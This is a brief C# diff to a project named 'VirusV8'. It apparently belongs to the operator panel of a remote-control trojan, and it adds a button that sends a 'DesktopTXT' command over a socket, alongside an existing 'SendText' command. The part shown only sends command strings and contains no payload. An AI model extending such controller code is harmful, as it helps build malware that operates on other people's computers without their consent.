@@ -7,6 +7,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.IO;
 
 namespace VirusV8
 {
@@ -238,6 +239,12 @@ namespace VirusV8
         private void Button_Keyboard_SendText_Click(object sender, EventArgs e)
         {
             byte[] bytes = Encoding.ASCII.GetBytes("SendText:" + richTextBoxSendText.Text);
+            s.send(bytes);
+        }
+
+        private void monoFlat_ButtonDektopTXT_Click(object sender, EventArgs e)
+        {
+            byte[] bytes = Encoding.ASCII.GetBytes("DesktopTXT");
             s.send(bytes);
         }
     }
